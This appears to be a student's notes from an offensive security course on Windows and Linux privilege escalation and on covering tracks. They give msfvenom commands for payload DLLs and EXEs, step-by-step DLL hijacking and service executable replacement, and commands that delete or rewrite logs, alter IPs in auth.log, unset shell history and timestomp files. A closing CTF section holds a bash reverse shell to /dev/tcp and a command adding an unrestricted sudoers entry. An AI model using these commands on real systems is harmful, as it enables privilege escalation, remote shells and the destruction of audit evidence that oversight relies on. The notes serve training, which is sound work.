### Windows
#### Scheduled Tasks and Services
* Write Permissions
* Non-Standard Locactions
* Unquoted Executable Paths
* Vulnerabilities in Executables
* Permissions to Run as `SYSTEM`
#### DEMO: Finding vulnerable Scheduled Tasks
schtasks /query /fo LIST /v

##### DLL Stuff
* Can you rename the file?
* Can you write to the directory?
* Go to procmon:
  - filter by process name "Name of Process"
  - Filter result contains "NAME NOT FOUND"
  - filter path contains ".dll"
* MSFVENOM
  - `msfvenom -p windows/exec CMD='cmd.exe /c "whoami" > C:\users\student\desktop\whoami.txt' -f dll > SSPICLI.dll`
  - SCP the file over to the windows station
#### EXE Replacement
* Can you rename the file?
* Can you write to the directory?
* MSFVENOM
  - `msfvenom -p windows/exec CMD='cmd.exe /c "whoami" > C:\users\student\desktop\whoami.txt' -f exe > putty.exe`
* Drag and drop the payload
```
auditpol /get /category:*
auditpol /get /category:* | findstr /i "success failure"
```
#### Important Microsoft Event IDs
* 4624/4625 - Successful/failed login
* 4720 - Account created
* 4672 - Adminstrative User logged on
* 7045 - Service Created

# checking UAC settings
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
./sigcheck.exe -m -accepteula 

## DLL hijacking method demo    use when youre on a target machine 
1. create a task called "putty.exe"
2. icacls "C:\program files (x86)\putty" /grant BUILTIN\users:W
3. net use Z: "\\http://live.sysinternals.com" /persistent:yes
4. Z:\>   ./procmon.exe -accepteula
    once opened look for process name contains putty.exe
    then path contains dll
    then result is NAME NOT FOUND
5. if nothing populates then run in ps : (get-process | ?{$_.name -like "putty"}).kill() and restart process 
5a. if something is found find a dll like in this demo SSPIC.DLL
then you do:
6. on linops**    msfvenom -p windows/exec CMD='cmd.exe /c "whoami" > C:\users\student\desktop\whoami.txt' -f dll > SSPICLI.dll
7. on ps:
    scp student@<linops>:/path/payload/inside/WinPRivEsc/SSPICLI.dll "C:\program files (x86)\putty\SSPICLI.dll"
8. then run putty.exe or whatever executable you use, should write on notepad the result of the command you msfvenom'd 

## EXE replacement 
msfvenom: msfvenom -p windows/exec CMD='cmd.exe /c "whoami" > C:\users\student\desktop\whoami.txt' -f exe > putty.exe

 ## audit logging 
 auditpol /get /category:*
 auditpol /get /category:* | findstr /i "success failure"


    
#### Linux
### Resources
* [GTFOBins](https://gtfobins.github.io)
#### Sudo Gotchas!
* Commands that can access the contents of other files
* Commands that download files
* Commands that execute other commands (Like editors)
* Dangerous Commands
#### SUID/SGID
* The User that owns the file can edit the file (SUID)
* The group that owns the file can edit the file (SGID)
* Everyone can edit the file, but only one user can delete the file (Sticky Bit)
* `find / -type f -perm /4000 -ls 2>/dev/null    # Find files with specific permissions (SUID: 4000) (SGID: 2000) (BOTH: 6000)`
#### Insecure Permissions
* CRON
  - `-l  # List`
  - `-e  # Edit`
  - `contab -u <user> -l  # List crontab for specific user`
* World-Writable Files and Directories
  - * `find / -type d -perm /2 -ls 2>/dev/null`
* Dot '.' in PATH
  - Lets you execute commands that are in your present working directory
  - `export PATH=".:$PATH"`
## Covering Your Tracks
#### Artifacts
* Things that we leave behind in a system
#### NIX-ism
* First thing: unset HISTILE
* Need to be  aware of init system in use
  - SYSTEMV, upstart, SYSTEMD, to name a few
  - Determines what commands to use and logging structure
* How to tell if sysV or Systemd `ps -p 1`
#### SystemD
* Utilizes `journalctl`
* `journalctl _TRANSPORT=audit | grep 603`
#### Working with Logs
```
file /var/log/wtmp
file /var/log -type f -mmin -10 2>/dev/null
journal -f -u ssh
journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4
```
#### Cleaning The Logs (Basic)
* Before we start cleaining, save the INODE!
  - Affect on the inode of using `mv` vs `cp` vs `cat`
##### Get rid of it
* `rm -rf /var/log/...`
##### Clear it
* `cat /dev/null > /var/log/...`
* `echo > /var/log/...`
#### Cleaning The Logs (Precise)
##### GREP (Remove)
* `egrep -v '10:49*| 15:15:15' auth.log > auth.log2; cat auth.log2 > auth.log; rm auth.log2`
##### SED (Replace)
* `cat auth.log > auth.log2; sed -i 's/10.16.10.93/136.132.1.1/g' auth.log2; cat auth.log2 > auth.log`
##### Timestomp
* `touch -c -t 201603051015 1.txt    # Explicit`
* `touch -r 3.txt 1.txt    # Reference`
#### Rsyslog
* Newer Rsyslog references `/etc/rsyslog.d/*` for settings/rules
* Older versions only uses `/etc/ryslog.conf`
* Find out with `grep "IncludeConfig /etc/rsyslog.conf`
```
kern.*                                                # All kernel messages, all severities
mail.crit
cron.!info,!debug
*.*  @192.168.10.254:514                                                    # Old format
*.* action(type="omfwd" target="192.168.10.254" port="514" protocol="udp")   # New format
#mail.*
```
# CTF
```
watch -n1 'ls -l'
/bin/bash -i >& /dev/tcp/192.168.28.135/33403 0>&1
/var/tmp/testbed/unknown /etc/sudoers 'comrade  ALL=(ALL:ALL) ALL'
```
